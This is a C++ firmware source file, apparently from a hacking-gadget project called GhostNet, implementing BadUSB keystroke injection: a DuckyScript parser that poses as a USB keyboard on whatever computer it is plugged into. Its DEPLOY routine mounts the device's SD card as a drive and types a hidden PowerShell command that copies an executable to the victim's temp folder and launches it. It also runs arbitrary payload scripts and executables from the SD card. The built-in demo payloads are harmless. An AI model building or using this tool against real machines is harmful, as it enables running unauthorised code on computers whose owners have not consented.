/*
 * ============================================================
 *  GhostNet — badusb.cpp
 *  BadUSB: DuckyScript Parser + USB HID Keyboard Injection
 *  Full SD-Card DuckyScript Engine (Bruce Feature)
 * ============================================================
 */

#include "badusb.h"
#include "USB.h"
#include "USBHIDKeyboard.h"
#include "sd_module.h"
#include "usb_msc_module.h"

static USBHIDKeyboard Keyboard;

// Built-in fallback payloads (when no SD or empty SD)
static const char* const PAYLOAD_NOTEPAD[] = {
  "REM Hello World — writes to SD card as hello.txt and opens on PC",
  "MOUNT_SD",
  "DELAY 2000",
  "GUI r",
  "DELAY 600",
  "STRING powershell -w hidden -c \"$d=((Get-Volume|? DriveType -eq Removable).DriveLetter|select -first 1);if(!$d){$d='C'};$f=$d+':\\hello.txt';'Hello World'|Set-Content $f;notepad $f\"",
  "ENTER"
};
static const int PAYLOAD_NOTEPAD_LINES = sizeof(PAYLOAD_NOTEPAD) / sizeof(PAYLOAD_NOTEPAD[0]);

static const char* const PAYLOAD_RICKROLL[] = {
  "REM Rickroll in Browser",
  "DELAY 500",
  "GUI r",
  "DELAY 500",
  "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ",
  "ENTER"
};
static const int PAYLOAD_RICKROLL_LINES = sizeof(PAYLOAD_RICKROLL) / sizeof(PAYLOAD_RICKROLL[0]);

static const char* const PAYLOAD_SYSINFO[] = {
  "REM Dump Host Info to CMD",
  "DELAY 500",
  "GUI r",
  "DELAY 500",
  "STRING cmd.exe",
  "ENTER",
  "DELAY 700",
  "STRING systeminfo | findstr /B /C:\"OS Name\" /C:\"System Model\"",
  "ENTER"
};
static const int PAYLOAD_SYSINFO_LINES = sizeof(PAYLOAD_SYSINFO) / sizeof(PAYLOAD_SYSINFO[0]);

BadUSB::BadUSB() {
  _running = false;
  _complete = false;
  _usbStarted = false;
  _selectedPayload = 0;
  _currentLine = 0;
  _delayUntil = 0;
  _defaultDelay = 0;
  _repeatCount = 0;
  _lastCommand[0] = '\0';
  strcpy(_statusText, "Ready");
  _payloadCount = 0;
  _loadPayloadsFromSD();
}

void BadUSB::init() {
  if (!_usbStarted) {
    Keyboard.begin();
    USB.begin();
    _usbStarted = true;
  }
}

void BadUSB::reloadPayloads() {
  _loadPayloadsFromSD();
}

void BadUSB::_loadPayloadsFromSD() {
  _payloadCount = 0;

  // Helper lambda to add payload entry safely
  auto addPayload = [this](const String& fname, const char* dirPrefix, bool isExe) {
    if (_payloadCount >= MAX_PAYLOADS) return;

    String base = fname;
    int slash = base.lastIndexOf('/');
    if (slash >= 0) base = base.substring(slash + 1);

    // Check for duplicates
    for (int j = 0; j < _payloadCount; j++) {
      if (strcmp(_payloads[j].name, base.c_str()) == 0) return;
    }

    int idx = _payloadCount++;
    strncpy(_payloads[idx].name, base.c_str(), 23);
    _payloads[idx].name[23] = '\0';

    snprintf(_payloads[idx].filename, sizeof(_payloads[idx].filename), "%s/%s", dirPrefix, base.c_str());
    _payloads[idx].isSD = true;
    _payloads[idx].isExe = isExe;

    if (isExe) {
      snprintf(_payloads[idx].description, sizeof(_payloads[idx].description), "EXE: %s", base.c_str());
      _payloads[idx].lineCount = 1;
    } else {
      snprintf(_payloads[idx].description, sizeof(_payloads[idx].description), "SD: %s", base.c_str());
      // Count lines in script
      File file = SD.open(_payloads[idx].filename, FILE_READ);
      int lines = 0;
      if (file) {
        while (file.available()) {
          file.readStringUntil('\n');
          lines++;
        }
        file.close();
      }
      _payloads[idx].lineCount = (lines > 0) ? lines : 1;
    }
  };

  // 1. Scan SD card /payloads directory (.txt, .dd, .exe)
  if (sdModule.isAvailable()) {
    if (!SD.exists("/payloads")) {
      SD.mkdir("/payloads");
    }

    File dir = SD.open("/payloads");
    if (dir && dir.isDirectory()) {
      File file = dir.openNextFile();
      while (file && _payloadCount < MAX_PAYLOADS) {
        String fname = file.name();
        if (!file.isDirectory()) {
          if (fname.endsWith(".txt") || fname.endsWith(".dd") || fname.endsWith(".TXT")) {
            addPayload(fname, "/payloads", false);
          } else if (fname.endsWith(".exe") || fname.endsWith(".EXE")) {
            addPayload(fname, "/payloads", true);
          }
        }
        file = dir.openNextFile();
      }
      dir.close();
    }

    // 2. Also scan /exes directory for .exe files so they show in BadUSB menu
    if (SD.exists("/exes")) {
      File exeDir = SD.open("/exes");
      if (exeDir && exeDir.isDirectory()) {
        File file = exeDir.openNextFile();
        while (file && _payloadCount < MAX_PAYLOADS) {
          String fname = file.name();
          if (!file.isDirectory() && (fname.endsWith(".exe") || fname.endsWith(".EXE"))) {
            addPayload(fname, "/exes", true);
          }
          file = dir.openNextFile();
        }
        exeDir.close();
      }
    }
  }

  // 3. If no SD payloads, populate with built-in presets
  if (_payloadCount == 0) {
    strcpy(_payloads[0].name, "Notepad Hello");
    strcpy(_payloads[0].description, "Saves hello.txt to SD & opens");
    strcpy(_payloads[0].filename, "builtin:notepad");
    _payloads[0].lineCount = PAYLOAD_NOTEPAD_LINES;
    _payloads[0].isSD = false;
    _payloads[0].isExe = false;

    strcpy(_payloads[1].name, "Rickroll Web");
    strcpy(_payloads[1].description, "Opens Rickroll in browser");
    strcpy(_payloads[1].filename, "builtin:rickroll");
    _payloads[1].lineCount = PAYLOAD_RICKROLL_LINES;
    _payloads[1].isSD = false;
    _payloads[1].isExe = false;

    strcpy(_payloads[2].name, "SysInfo CMD");
    strcpy(_payloads[2].description, "Opens CMD and prints specs");
    strcpy(_payloads[2].filename, "builtin:sysinfo");
    _payloads[2].lineCount = PAYLOAD_SYSINFO_LINES;
    _payloads[2].isSD = false;
    _payloads[2].isExe = false;

    _payloadCount = 3;
  }
}

int BadUSB::getPayloadCount() const { return _payloadCount; }
PayloadInfo* BadUSB::getPayload(int index) {
  if (index >= 0 && index < _payloadCount) return &_payloads[index];
  return nullptr;
}
PayloadInfo* BadUSB::getPayloads() { return _payloads; }
void BadUSB::selectPayload(int index) {
  if (index >= 0 && index < _payloadCount) _selectedPayload = index;
}
int BadUSB::getSelectedPayload() const { return _selectedPayload; }

void BadUSB::startExecution() {
  init();
  _running = true;
  _complete = false;
  _currentLine = 0;
  _delayUntil = 0;
  _defaultDelay = 0;
  strcpy(_statusText, "Executing...");

  // Direct .exe execution from BadUSB menu
  if (_payloads[_selectedPayload].isExe) {
    strcpy(_statusText, "Deploying EXE...");
    deployExe(_payloads[_selectedPayload].name, true);
    _running = false;
    _complete = true;
    return;
  }

  if (_payloads[_selectedPayload].isSD) {
    if (_activeFile) _activeFile.close();
    _activeFile = SD.open(_payloads[_selectedPayload].filename, FILE_READ);
    if (!_activeFile) {
      _running = false;
      _complete = true;
      strcpy(_statusText, "File Open Error");
    }
  }
}

void BadUSB::stopExecution() {
  _running = false;
  if (_activeFile) {
    _activeFile.close();
  }
  releaseAll();
  strcpy(_statusText, "Stopped");
}

void BadUSB::executeNextLine() {
  if (!_running || _complete) return;
  if (millis() < _delayUntil) return;

  String line = "";

  if (_payloads[_selectedPayload].isSD) {
    if (!_activeFile || !_activeFile.available()) {
      _running = false;
      _complete = true;
      if (_activeFile) _activeFile.close();
      strcpy(_statusText, "Finished");
      return;
    }
    line = _activeFile.readStringUntil('\n');
    line.trim();
  } else {
    // Built-in payloads
    int total = _payloads[_selectedPayload].lineCount;
    if (_currentLine >= total) {
      _running = false;
      _complete = true;
      strcpy(_statusText, "Finished");
      return;
    }

    if (_selectedPayload == 0) line = PAYLOAD_NOTEPAD[_currentLine];
    else if (_selectedPayload == 1) line = PAYLOAD_RICKROLL[_currentLine];
    else if (_selectedPayload == 2) line = PAYLOAD_SYSINFO[_currentLine];
  }

  if (line.length() > 0) {
    parseLine(line.c_str());
  }

  _currentLine++;
  if (_defaultDelay > 0) {
    _delayUntil = millis() + _defaultDelay;
  }
}

void BadUSB::parseLine(const char* line) {
  if (!line || strlen(line) == 0) return;

  // Store for REPEAT command
  if (strncmp(line, "REPEAT", 6) != 0) {
    strncpy(_lastCommand, line, sizeof(_lastCommand) - 1);
    _lastCommand[sizeof(_lastCommand) - 1] = '\0';
  }

  // 1. Comments
  if (strncmp(line, "REM", 3) == 0) {
    return;
  }

  // 2. Default delay
  if (strncmp(line, "DEFAULT_DELAY ", 14) == 0 || strncmp(line, "DEFAULTDELAY ", 13) == 0) {
    const char* arg = strchr(line, ' ');
    if (arg) _defaultDelay = atoi(arg + 1);
    return;
  }

  // 3. Explicit delay
  if (strncmp(line, "DELAY ", 6) == 0) {
    int d = atoi(line + 6);
    _delayUntil = millis() + d;
    return;
  }

  // 4. String / typing
  if (strncmp(line, "STRING ", 7) == 0) {
    typeString(line + 7);
    return;
  }

  // 4b. DEPLOY / DEPLOY_ONLY — mount SD as USB drive and run EXE
  if (strncmp(line, "DEPLOY_ONLY ", 12) == 0) {
    _handleDEPLOY(line + 12, false);
    return;
  }
  if (strncmp(line, "DEPLOY ", 7) == 0) {
    _handleDEPLOY(line + 7, true);
    return;
  }

  // 4c. MOUNT_SD / UNMOUNT_SD — mount/unmount SD card as USB Mass Storage
  if (strcasecmp(line, "MOUNT_SD") == 0 || strcasecmp(line, "MSC_MOUNT") == 0) {
    if (!mscModule.isMounted()) {
      mscModule.mountSD();
    }
    delay(2000);
    return;
  }
  if (strcasecmp(line, "UNMOUNT_SD") == 0 || strcasecmp(line, "MSC_UNMOUNT") == 0) {
    if (mscModule.isMounted()) {
      mscModule.unmountSD();
    }
    return;
  }

  // 5. GUI / Windows key shortcuts
  if (strncmp(line, "GUI ", 4) == 0 || strncmp(line, "WINDOWS ", 8) == 0) {
    const char* k = strchr(line, ' ');
    if (k && *(k + 1) != '\0') {
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(*(k + 1));
      delay(30);
      Keyboard.releaseAll();
    } else {
      Keyboard.write(KEY_LEFT_GUI);
    }
    return;
  }

  // 6. Modifier Combos (CTRL, ALT, SHIFT)
  if (strncmp(line, "CTRL ", 5) == 0 || strncmp(line, "CONTROL ", 8) == 0) {
    const char* k = strchr(line, ' ');
    if (k && *(k + 1) != '\0') {
      Keyboard.press(KEY_LEFT_CTRL);
      if (strcasecmp(k + 1, "ALT DELETE") == 0 || strcasecmp(k + 1, "ALT DEL") == 0) {
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press(KEY_DELETE);
      } else {
        Keyboard.press(*(k + 1));
      }
      delay(30);
      Keyboard.releaseAll();
    }
    return;
  }

  if (strncmp(line, "ALT ", 4) == 0) {
    const char* k = line + 4;
    if (strcasecmp(k, "F4") == 0) {
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_F4);
      delay(30);
      Keyboard.releaseAll();
    } else if (strcasecmp(k, "TAB") == 0) {
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(KEY_TAB);
      delay(30);
      Keyboard.releaseAll();
    } else if (*k != '\0') {
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press(*k);
      delay(30);
      Keyboard.releaseAll();
    }
    return;
  }

  // 7. Individual Special Keys
  if (strcasecmp(line, "ENTER") == 0) {
    Keyboard.write(KEY_RETURN);
  } else if (strcasecmp(line, "TAB") == 0) {
    Keyboard.write(KEY_TAB);
  } else if (strcasecmp(line, "ESCAPE") == 0 || strcasecmp(line, "ESC") == 0) {
    Keyboard.write(KEY_ESC);
  } else if (strcasecmp(line, "BACKSPACE") == 0) {
    Keyboard.write(KEY_BACKSPACE);
  } else if (strcasecmp(line, "DELETE") == 0 || strcasecmp(line, "DEL") == 0) {
    Keyboard.write(KEY_DELETE);
  } else if (strcasecmp(line, "SPACE") == 0) {
    Keyboard.write(' ');
  } else if (strcasecmp(line, "CAPSLOCK") == 0) {
    Keyboard.write(KEY_CAPS_LOCK);
  } else if (strcasecmp(line, "UP") == 0 || strcasecmp(line, "UPARROW") == 0) {
    Keyboard.write(KEY_UP_ARROW);
  } else if (strcasecmp(line, "DOWN") == 0 || strcasecmp(line, "DOWNARROW") == 0) {
    Keyboard.write(KEY_DOWN_ARROW);
  } else if (strcasecmp(line, "LEFT") == 0 || strcasecmp(line, "LEFTARROW") == 0) {
    Keyboard.write(KEY_LEFT_ARROW);
  } else if (strcasecmp(line, "RIGHT") == 0 || strcasecmp(line, "RIGHTARROW") == 0) {
    Keyboard.write(KEY_RIGHT_ARROW);
  } else if (strcasecmp(line, "PAGEUP") == 0) {
    Keyboard.write(KEY_PAGE_UP);
  } else if (strcasecmp(line, "PAGEDOWN") == 0) {
    Keyboard.write(KEY_PAGE_DOWN);
  } else if (strcasecmp(line, "HOME") == 0) {
    Keyboard.write(KEY_HOME);
  } else if (strcasecmp(line, "END") == 0) {
    Keyboard.write(KEY_END);
  } else if (strncmp(line, "REPEAT ", 7) == 0) {
    int reps = atoi(line + 7);
    for (int i = 0; i < reps; i++) {
      parseLine(_lastCommand);
      delay(20);
    }
  }
}

void BadUSB::typeString(const char* str) {
  Keyboard.print(str);
}

void BadUSB::pressKey(uint8_t key) {
  Keyboard.write(key);
}

void BadUSB::pressModifierCombo(uint8_t modifier, uint8_t key) {
  Keyboard.press(modifier);
  Keyboard.press(key);
  delay(30);
  Keyboard.releaseAll();
}

void BadUSB::releaseAll() {
  Keyboard.releaseAll();
}

bool BadUSB::isRunning() const { return _running; }
bool BadUSB::isComplete() const { return _complete; }
int BadUSB::getCurrentLine() const { return _currentLine; }
int BadUSB::getTotalLines() const {
  if (_selectedPayload >= 0 && _selectedPayload < _payloadCount) return _payloads[_selectedPayload].lineCount;
  return 0;
}
float BadUSB::getProgress() const {
  int total = getTotalLines();
  if (total == 0) return 0;
  return (float)_currentLine / (float)total;
}
const char* BadUSB::getStatusText() const { return _statusText; }

// ── DEPLOY command handler ────────────────────────────────
void BadUSB::_handleDEPLOY(const char* filename, bool executeAfter) {
  deployExe(filename, executeAfter);
}

void BadUSB::deployExe(const char* filename, bool executeAfter) {
  if (!filename || strlen(filename) == 0) {
    Serial.println(F("[BadUSB] DEPLOY: No filename specified"));
    return;
  }

  // Check if file exists on SD card in /exes or /payloads
  char fullPath[64];
  snprintf(fullPath, sizeof(fullPath), "/exes/%s", filename);

  if (!sdModule.isAvailable() || !SD.exists(fullPath)) {
    snprintf(fullPath, sizeof(fullPath), "/payloads/%s", filename);
    if (!SD.exists(fullPath)) {
      Serial.printf("[BadUSB] DEPLOY: File not found: %s\n", filename);
      strcpy(_statusText, "File not found!");
      return;
    }
  }

  Serial.printf("[BadUSB] DEPLOY: Mounting SD and deploying %s\n", filename);
  strcpy(_statusText, "Deploying...");

  // Step 1: Mount SD card as USB Mass Storage
  if (!mscModule.isMounted()) {
    mscModule.mountSD();
  }

  // Step 2: Wait for target OS to detect the new USB drive
  delay(2500);

  // Step 3: Type a PowerShell command on the target that:
  //   - Scans all drives to find the one containing /exes/<filename> or /payloads/<filename>
  //   - Copies it to %TEMP% and optionally executes it
  // This handles any drive letter assignment automatically.

  // Open Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(30);
  Keyboard.releaseAll();
  delay(600);

  // Build and type the PowerShell command
  if (executeAfter) {
    // DEPLOY: Download and execute
    char cmd[320];
    snprintf(cmd, sizeof(cmd),
      "powershell -w hidden -c \""
      "$f='%s';"
      "$d=(Get-PSDrive -PSProvider FileSystem).Root;"
      "foreach($r in $d){"
        "$p=$r+'exes\\'+$f;"
        "if(-not(Test-Path $p)){$p=$r+'payloads\\'+$f};"
        "if(Test-Path $p){"
          "$t=$env:TEMP+'\\'+$f;"
          "Copy-Item $p $t -Force;"
          "Start-Process $t;"
          "break"
        "}"
      "}"
      "\"",
      filename
    );
    Keyboard.print(cmd);
  } else {
    // DEPLOY_ONLY: Download only (copy to temp)
    char cmd[320];
    snprintf(cmd, sizeof(cmd),
      "powershell -w hidden -c \""
      "$f='%s';"
      "$d=(Get-PSDrive -PSProvider FileSystem).Root;"
      "foreach($r in $d){"
        "$p=$r+'exes\\'+$f;"
        "if(-not(Test-Path $p)){$p=$r+'payloads\\'+$f};"
        "if(Test-Path $p){"
          "Copy-Item $p ($env:TEMP+'\\'+$f) -Force;"
          "break"
        "}"
      "}"
      "\"",
      filename
    );
    Keyboard.print(cmd);
  }

  delay(50);
  Keyboard.write(KEY_RETURN);

  if (executeAfter) {
    strcpy(_statusText, "Deployed+Run");
  } else {
    strcpy(_statusText, "Deployed");
  }
  Serial.printf("[BadUSB] DEPLOY: %s complete (exec=%s)\n", filename, executeAfter ? "yes" : "no");
}

